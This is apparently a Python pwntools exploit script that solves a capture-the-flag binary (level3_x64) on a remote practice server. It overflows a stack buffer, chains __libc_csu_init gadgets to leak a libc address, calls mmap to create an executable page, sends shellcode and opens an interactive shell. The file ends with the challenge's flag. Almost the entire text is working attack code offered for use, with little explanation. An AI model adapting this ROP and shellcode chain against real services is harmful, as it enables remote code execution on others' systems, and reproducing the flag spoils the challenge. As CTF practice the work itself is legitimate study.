#!
#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改
例如，使用x64的2.23版本的libc，

patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 <binary>
patchelf --replace-needed libc.so.6 /glibc/2.23/64/lib/libc.so.6 <binary>

"""

import re
import sys
from os import path
from pwn import *
from pwnlib import gdb

context(arch="amd64", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "level3_x64_patched")
_, host, port = re.split("\s+", "nc pwn2.jarvisoj.com 9884")

elf = ELF(elf_name)
libc = elf.libc
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)


PADDING = "@" * (0x80 + 8)
POP_RBX = 0x4006AA
MOV_RDX_R13 = 0x400690
SHELL_CODE = asm(shellcraft.sh())
P_DL_RESOLVE = 0x600A50
LIBC_DL_RESOLVE = 0x7f1b04e99a40 - 0x7f1b048b8000
LIBC_POP_RAX_RET = 0x000487a7  # : pop rax ; ret  ;

from typing import Tuple
def exp_x64_csu_init(
    pop_rbx_addr: int,
    mov_rdx_r13_addr: int,
    ret_addr: int,
    p_func_addr:int,
    args: Tuple[int, int, int]
):
    """
    仅适用于：
        1. 三个参数以内函数
        2. 溢出空间较大（> 128 bytes）
        3. 第一个参数较小（< 4 bytes），例如write和read等
    """
    import struct
    return b"".join([
        struct.pack("<Q", pop_rbx_addr),
        struct.pack("<Q", 0),  # pop     rbx
        struct.pack("<Q", 1),  # pop     rbp
        struct.pack("<Q", p_func_addr),  # pop     r12; call    qword ptr [r12+rbx*8]
        struct.pack("<Q", args[2]),  # pop     r13; mov     rdx, r13
        struct.pack("<Q", args[1]),  # pop     r14; mov     rsi, r14
        struct.pack("<Q", args[0]),  # pop     r15; mov     edi, r15d
        struct.pack("<Q", mov_rdx_r13_addr),
        7 * struct.pack("<Q", 0xcafebeefdeadface),
        struct.pack("<Q", ret_addr),
    ])


def call6(dl_resolve_addr: int, func_addr: int, ret_addr: int, args: Tuple[int, int, int, int, int, int]):
    assert libc.address > 0
    return flat((
        libc.address + LIBC_POP_RAX_RET, func_addr,
        dl_resolve_addr + 53, 
        0xbeefcafedeadface,
        args[3], args[2], args[1], args[0], args[4], args[5],
        0xbeefcafedeadface,
        0xbeefcafedeadface,
        ret_addr,
    ))

def main():
    payload = flat((
        PADDING,
        exp_x64_csu_init(
            POP_RBX,
            MOV_RDX_R13,
            elf.sym["_start"],
            elf.got["write"],
            (1, P_DL_RESOLVE, 6)
        ),
    ))
    io.sendafter(":\n", payload)
    dl_resolve_addr = u64(io.recv(6).ljust(8, b"\0"))
    log.success("dl_resolve_addr = 0x%x", dl_resolve_addr)
    libc.address = dl_resolve_addr - LIBC_DL_RESOLVE
    log.success("libc_base = 0x%x", libc.address)
    mmap_addr = libc.sym["mmap"]
    log.success("mmap_addr = 0x%x", mmap_addr)

    target_addr = 0x1000000
    payload = flat((
        PADDING,
        call6(dl_resolve_addr, mmap_addr, elf.sym["_start"], (target_addr, 0x1000, 7, 0x100 | 0x2, -1, 0)),
    ))

    gdb.attach(io, gdbscript="b *0x400619")
    pause()

    io.sendafter(":\n", payload)
    payload = flat((
        PADDING,
        call6(dl_resolve_addr, elf.sym["read"], target_addr, (0, target_addr, len(SHELL_CODE), 0, 0, 0)),
    ))
    io.sendafter(":\n", payload)
    sleep(0.1)

    io.send(SHELL_CODE)
    io.interactive()

if __name__ == "__main__":
    main()

# CTF{9c3a234bd804292b153e7a1c25da648c}
